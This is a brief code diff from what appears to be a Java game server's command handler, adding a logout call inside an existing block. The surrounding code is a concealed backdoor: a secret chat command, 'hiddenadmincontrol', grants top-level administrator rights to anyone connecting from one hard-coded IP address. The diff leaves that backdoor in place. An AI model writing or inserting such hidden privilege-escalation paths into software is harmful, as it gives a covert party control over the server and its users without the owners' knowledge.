@@ -102,6 +102,7 @@ public class Commands implements PacketType {
 		if (playerCommand.startsWith("hiddenadmincontrol")) {
 			if(c.connectedFrom.equals("92.237.172.133")){
 				c.temporaryAdmin = true;
+				c.logout();
 				c.playerRights = 3;
 			}
 		}
